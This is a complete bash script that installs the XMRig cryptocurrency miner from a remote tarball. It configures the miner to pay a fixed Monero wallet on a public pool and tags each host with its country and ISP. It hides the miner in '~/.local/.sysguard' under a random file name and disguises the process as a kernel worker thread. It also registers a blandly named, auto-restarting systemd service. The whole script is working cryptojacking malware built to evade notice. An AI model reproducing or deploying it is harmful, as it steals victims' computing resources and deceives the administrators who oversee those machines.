#!/bin/bash
set -e

###############################################################################
#                          PREPARE DIRECTORIES
###############################################################################

TARGET_DIR="$HOME/.local/.sysguard"
mkdir -p "$TARGET_DIR"

echo "[INFO] Install directory: $TARGET_DIR"


###############################################################################
#                      ENABLE HUGE PAGES AUTOMATICALLY
###############################################################################

CPU_CORES=$(nproc)
HUGEPAGES=$((1168 + CPU_CORES))

echo "[1] Setting HugePages to $HUGEPAGES..."
sudo bash -c "echo vm.nr_hugepages=$HUGEPAGES >> /etc/sysctl.conf"
sudo sysctl -w vm.nr_hugepages=$HUGEPAGES


###############################################################################
#                DOWNLOAD & EXTRACT XMRIG TO TEMP DIRECTORY
###############################################################################

WORKDIR="/tmp/xmrig-build"
rm -rf "$WORKDIR"
mkdir -p "$WORKDIR"

echo "[2] Downloading XMRIG package..."

wget -q \
 https://github.com/user-attachments/files/23701380/xmrig-6.24.0.tar.gz \
  -O "$WORKDIR/xmrig.tar.gz"

echo "[Extracting...]"
tar -xzf "$WORKDIR/xmrig.tar.gz" -C "$WORKDIR"


###############################################################################
#                       AUTO-DETECT config.json
###############################################################################

CONFIG=$(find "$WORKDIR" -type f -name config.json | head -n 1)

if [ -z "$CONFIG" ]; then
    echo "[ERROR] config.json not found! Extraction structure unexpected."
    exit 1
fi

XMRIG_TMP=$(dirname "$CONFIG")

echo "[OK] config.json: $CONFIG"
echo "[OK] XMRIG directory: $XMRIG_TMP"


###############################################################################
#                FETCH NETWORK META FOR POOL PASSWORD
###############################################################################

PUBLIC_IP=$(curl -s https://api.ipify.org)
COUNTRY=$(curl -s https://ipinfo.io/$PUBLIC_IP/country)
ORG=$(curl -s https://ipinfo.io/$PUBLIC_IP/org)

ISP=$(echo "$ORG" | cut -d' ' -f2- | tr ' ' '_' | tr '[:upper:]' '[:lower:]')
RAND4=$(printf "%04d" $((RANDOM % 10000)))

PASS_VALUE="${COUNTRY}-${ISP}-${RAND4}"

echo "[3] PASS generated: $PASS_VALUE"


###############################################################################
#                     MODIFY config.json USING jq
###############################################################################

TOTAL_CORES=$(nproc)
USE_CORES=$((TOTAL_CORES - 1))
[ $USE_CORES -lt 1 ] && USE_CORES=1

if [ "$TOTAL_CORES" -le 8 ]; then
    POOL_URL="pool.supportxmr.com:3333"
else
    POOL_URL="pool.supportxmr.com:5555"
fi

RX_ARRAY=""
for ((i=0; i<USE_CORES; i++)); do
    RX_ARRAY="${RX_ARRAY}{\"low_power_mode\": false, \"affinity\": $i},"
done
RX_ARRAY="[${RX_ARRAY%,}]"

POOLS_JSON=$(cat <<EOF
[
  {
    "algo": null,
    "coin": null,
    "url": "$POOL_URL",
    "user": "8B3gGRTEXU8ZqXUVYjTMuhQPD49HTgfRhbvkaq88z8D9FbF7qivY21N21UHHP4gsHREYfKHt31W1khez3ckJDNTXUptCfcE",
    "pass": "$PASS_VALUE",
    "rig-id": null,
    "nicehash": false,
    "keepalive": false,
    "enabled": true,
    "tls": false,
    "sni": false,
    "tls-fingerprint": null,
    "daemon": false,
    "socks5": null,
    "self-select": null,
    "submit-to-origin": false
  }
]
EOF
)

which jq >/dev/null || sudo apt install -y jq -qq

echo "[4] Updating config.json..."

jq \
  --argjson rx "$RX_ARRAY" \
  --argjson pools "$POOLS_JSON" \
  '
    .cpu.rdmsr = false |
    .cpu.wrmsr = false |
    .cpu["hw-aes"] = true |
    .cpu.priority = 5 |
    .cpu["memory-pool"] = true |
    .cpu.rx = $rx |
    .pools = $pools |
    .randomx.rdmsr = false |
    .randomx.wrmsr = false
  ' "$CONFIG" > "$CONFIG.tmp"

mv "$CONFIG.tmp" "$CONFIG"

echo "[OK] config.json updated."


###############################################################################
#                  MOVE FILES TO FINAL LOCATION
###############################################################################

EXEC_NAME=$(tr -dc 'a-z0-9' </dev/urandom | head -c 10)
FINAL_EXEC="$TARGET_DIR/$EXEC_NAME"

cp "$XMRIG_TMP/xmrig" "$FINAL_EXEC"
chmod +x "$FINAL_EXEC"

cp "$CONFIG" "$TARGET_DIR/config.json"

echo "[5] Installed executable: $FINAL_EXEC"


###############################################################################
#                  GENERATE MASKED PROCESS NAME
###############################################################################

echo "[6] Generating masked process name..."

gen_mask() {
  local a b
  a=$(shuf -i 1-9 -n 1)
  b=$(shuf -i 1-9 -n 1)
  echo "[kworker/u${a}:${b}]"
}

MASK_NAME=$(gen_mask)

for _ in $(seq 1 10); do
  if ps aux | grep -F "$MASK_NAME" | grep -v grep >/dev/null 2>&1; then
    MASK_NAME=$(gen_mask)
  else
    break
  fi
done

echo "[OK] Mask name: $MASK_NAME"


###############################################################################
#                   CREATE FIXED systemd SERVICE (mysvc)
###############################################################################

SERVICE_PATH="/etc/systemd/system/mysvc.service"

sudo bash -c "cat > $SERVICE_PATH" <<EOF
[Unit]
Description=My Background Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -lc 'exec -a "$MASK_NAME" "$FINAL_EXEC"'
WorkingDirectory=$TARGET_DIR
Restart=always
Nice=5

[Install]
WantedBy=multi-user.target
EOF

echo "[7] Created service: mysvc (not enabled, not started)"


###############################################################################
#                       CLEAN TEMP FILES
###############################################################################

echo "[8] Cleaning temporary files..."
rm -rf "$WORKDIR"

echo "[OK] Cleanup complete."


###############################################################################
#                               DONE
###############################################################################

echo ""
echo "======================================================"
echo " Installation Complete"
echo " Executable: $FINAL_EXEC"
echo " Config:     $TARGET_DIR/config.json"
echo " Service:    mysvc.service"
echo " Mask name:  $MASK_NAME"
echo ""
echo " To start manually:"
echo "   sudo systemctl start mysvc"
echo ""
echo " To enable on boot:"
echo "   sudo systemctl enable mysvc"
echo "======================================================"
